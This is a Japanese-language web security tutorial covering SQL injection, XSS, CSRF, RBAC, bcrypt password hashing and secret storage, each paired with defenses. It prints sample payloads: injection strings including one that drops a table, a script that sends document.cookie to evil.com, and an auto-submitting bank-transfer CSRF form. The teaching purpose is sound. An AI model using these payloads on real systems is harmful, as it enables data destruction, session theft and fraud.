## はじめて読む人へ

セキュリティ詳解では、代表的な攻撃がどのように起き、どう防ぐかをコードの視点で学びます。攻撃手法を知る目的は悪用ではなく、安全な設計を選べるようになることです。

コードやコマンドが出てきたら、最初から全部を覚えようとしなくて大丈夫です。まずは「何を入力し、何が処理され、何が出力されるのか」を文章で説明できるように読むと、手を動かす前の理解が安定します。

### 読む前に押さえること

- SQLインジェクションは、文字列結合でSQLを作ると起きやすくなります。
- XSS は、ユーザー入力をHTMLとして実行してしまう攻撃です。
- 認証と認可を分けて考えると、権限設計が整理できます。

### 読み終えたら説明できること

- SQLインジェクション、XSS、CSRF の違いを説明できる。
- プレースホルダやエスケープの必要性を理解できる。
- パスワード保存や秘密情報管理の基本を説明できる。

## SQL インジェクション

SQL インジェクションは、ユーザー入力をそのままSQL文字列に埋め込むことで、攻撃者が意図しないSQLを実行できてしまう脆弱性です。ログイン画面や検索フォームなど、入力をSQLに使う場所で起きます。

対策の基本は、文字列結合でSQLを作らないことです。プレースホルダを使うと、入力値はSQLの命令ではなくデータとして扱われるため、攻撃用の文字列を渡されても構文として実行されません。

ユーザーの入力をそのまま SQL に埋め込んでしまうことで、意図しない SQL が実行される脆弱性です。

### 攻撃の仕組み

```python
# 脆弱なコード（文字列結合で SQL を組み立てています）
query = f"SELECT * FROM users WHERE email = '{user_input}'"
```

このコードの問題は、`user_input` が「ただのメールアドレス」として扱われる保証がないことです。入力欄にSQLの一部として意味を持つ文字列を入れられると、完成したSQL文の構造そのものが変わってしまいます。

ユーザーが `' OR '1'='1` と入力すると：

```sql
SELECT * FROM users WHERE email = '' OR '1'='1'
-- 全ユーザーが返ってきます
```

`'1'='1'` は常に真です。そのため、メールアドレスが一致しなくても `OR` の右側が真になり、条件全体が真になります。ログイン処理でこのようなSQLを書いていると、本来許可されないユーザーまで取得される危険があります。

さらに悪意ある入力 `'; DROP TABLE users; --` では：

```sql
SELECT * FROM users WHERE email = ''; DROP TABLE users; --'
-- users テーブルが削除されます
```

`;` はSQL文の区切り、`--` はコメントを表します。攻撃者は文字列を途中で終わらせ、別のSQL文を追加し、残りをコメントとして無効化しようとします。DBやドライバの設定によって複数文実行が制限されることもありますが、文字列結合でSQLを作ること自体が危険です。

### 防御策：プレースホルダ（パラメータバインディング）

```python
# 安全なコード（プレースホルダを使います）
cursor.execute("SELECT * FROM users WHERE email = %s", (user_input,))
```

プレースホルダを使うと、SQLの構造と入力データが分離されます。`user_input` に `' OR '1'='1` が入っていても、それはSQL命令ではなく「メールアドレス欄に入った文字列」として扱われます。

```python
# SQLAlchemy での例
result = session.execute(
    select(User).where(User.email == user_input)
)
```

ORMを使う場合も、基本的にはSQLと値を分けて扱います。ただし、ORMを使っていても、生SQLを文字列結合で作れば同じ危険があります。「ORMなら絶対安全」ではなく、「入力を命令として混ぜない」ことが本質です。

SQL とデータを別々に渡すことで、データが SQL として解釈されなくなります。  
**原則：ユーザー入力を文字列結合で SQL に組み込まないでください。必ずプレースホルダを使ってください。**

## XSS（クロスサイトスクリプティング）

悪意のあるスクリプトをページに埋め込み、他のユーザーのブラウザで実行させる攻撃です。

### 攻撃の仕組み

コメント欄などに以下を投稿します：

```html
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>
```

このコメントを他のユーザーが閲覧すると、そのユーザーのブラウザで JavaScript が実行され Cookie が盗まれます。

XSS の怖いところは、攻撃コードがサーバーではなく被害者のブラウザで動くことです。ブラウザから見ると、そのスクリプトは正規サイト上で実行されているように見えるため、Cookieやページ内の情報にアクセスできる場合があります。

### 防御策

**1. HTML エスケープ（出力のサニタイズ）**

`<` → `&lt;`、`>` → `&gt;`、`"` → `&quot;` に変換することで、HTML タグとして解釈されなくなります。

React / Vue などの現代的なフレームワークは、テンプレート内で自動エスケープします。  
`dangerouslySetInnerHTML`（React）や `v-html`（Vue）は意図的にエスケープを無効化するため、使用には注意が必要です。

**2. CSP（Content Security Policy）**

レスポンスヘッダーでスクリプトの読み込み元を制限します。

```
Content-Security-Policy: script-src 'self' https://trusted.cdn.com
```

CSP は「このページで実行してよいスクリプトの読み込み元」をブラウザに伝えるヘッダーです。たとえば `script-src 'self'` なら、同じオリジンのスクリプトだけを許可します。万一HTMLへの埋め込みが起きても、外部の攻撃スクリプトを実行しにくくできます。

## CSRF（クロスサイトリクエストフォージェリ）

ユーザーが意図しない操作を別のサイトから実行させる攻撃です。

### 攻撃の仕組み

```
1. ユーザーが example-bank.com にログイン中（Cookie にセッションあり）
2. 攻撃者のサイト evil.com を開きます
3. evil.com に以下の HTML が仕込まれています：

<form action="https://example-bank.com/transfer" method="POST">
  <input name="to" value="攻撃者口座">
  <input name="amount" value="100000">
</form>
<script>document.forms[0].submit()</script>

4. ブラウザが自動的に Cookie を付けて振込リクエストを送ってしまいます
```

CSRF は、攻撃者がCookieを盗む攻撃ではありません。ブラウザが「対象サイトへのリクエストには自動的にCookieを付ける」という性質を悪用します。ユーザー本人のブラウザから送られるため、サーバー側から見ると正規ユーザーの操作に見えてしまいます。

### 防御策

**1. CSRF トークン**

サーバーがランダムなトークンをフォームに埋め込み、リクエスト時に検証します。攻撃者はトークンを読み取れないため成立しません。

```html
<form method="POST">
  <input type="hidden" name="csrf_token" value="ランダムな値">
  ...
</form>
```

CSRFトークンは、正規のページを表示した人だけが知っているランダムな値です。フォーム送信時にその値も一緒に送り、サーバーが一致を確認します。攻撃者の別サイトからは正規ページ内のトークンを読めないため、同じリクエストを作りにくくなります。

**2. SameSite Cookie**

```
Set-Cookie: session_id=abc; SameSite=Strict
```

他のサイトからのリクエストでは Cookie を送らなくなります。現代のブラウザではこれが最も効果的です。

`SameSite=Strict` は強力ですが、外部サイトから戻ってくるログイン連携などで不便になる場合があります。その場合は `Lax` を検討します。セキュリティ設定は、強ければ常に良いというより、必要なユーザー導線とのバランスで選びます。

## 認証・認可の設計

### 最小権限の原則

ユーザー・プロセスには必要最小限の権限だけを与えます。  
例：DB 接続ユーザーに `DROP TABLE` の権限を与えません。

### 認可（アクセス制御）の実装パターン

**RBAC（Role-Based Access Control）：** ロール（役割）に権限を付与し、ユーザーにロールを割り当てます。

```
ユーザー → ロール（admin / editor / viewer） → 権限（read / write / delete）
```

RBAC では、ユーザーごとに直接権限を付けるのではなく、ロールに権限をまとめます。たとえば `editor` には記事の作成・更新を許可し、`viewer` には閲覧だけを許可します。ユーザーの役割が変わったときは、割り当てるロールを変えれば済みます。

**確認すべき観点：**
- 自分のリソース以外にアクセスできないか（水平方向の権限昇格）
- 一般ユーザーが管理者機能を呼び出せないか（垂直方向の権限昇格）

## 暗号化

### パスワードの保存

パスワードは**平文で保存してはいけません**。bcrypt・Argon2 などのハッシュ関数で保存します。

```python
from passlib.hash import bcrypt

# 保存時
hashed = bcrypt.hash("user_password")

# 検証時（平文とハッシュを比較します）
is_valid = bcrypt.verify("user_password", hashed)
```

保存するのは平文パスワードではなく、`bcrypt.hash(...)` で作ったハッシュです。ログイン時には、入力されたパスワードを同じ方式で検証し、保存済みハッシュと対応するかを確認します。bcrypt はソルトと計算コストを含むため、同じパスワードでも毎回違うハッシュになります。

**MD5・SHA-1 はパスワード保存に使わないでください。** これらは高速すぎるため、レインボーテーブル攻撃に弱いです。

> **レインボーテーブル攻撃：** 「よくあるパスワード → ハッシュ値」の対応表（レインボーテーブル）をあらかじめ計算しておき、漏洩したハッシュを逆引きして平文を特定する攻撃です。bcrypt は計算が遅いうえにランダムな「ソルト（塩）」を加えるため、同じパスワードでも毎回異なるハッシュになり、レインボーテーブルが無効化されます。

### 通信の暗号化

- サーバー–クライアント間：TLS（HTTPS）を使います
- DB 接続：`sslmode=require` で暗号化を強制します

### 機密情報の管理

| 場所 | 可否 |
|------|------|
| ソースコードに直書き | NG（GitHub に公開されます） |
| `.env` ファイル（.gitignore 済み） | OK（ローカル開発のみ） |
| 環境変数（CI/CD・クラウド設定） | OK |
| Secret Manager（AWS Secrets Manager など） | 推奨（本番環境） |

## まとめ：攻撃と防御の対応表

| 攻撃 | 防御策 |
|------|--------|
| SQL インジェクション | プレースホルダ（パラメータバインディング） |
| XSS | HTML エスケープ・CSP ヘッダー |
| CSRF | CSRF トークン・SameSite Cookie |
| セッションハイジャック | HttpOnly・Secure Cookie・短い有効期限 |
| パスワード漏洩 | bcrypt/Argon2 でハッシュ保存 |
| 権限昇格 | RBAC・リクエストごとの認可チェック |
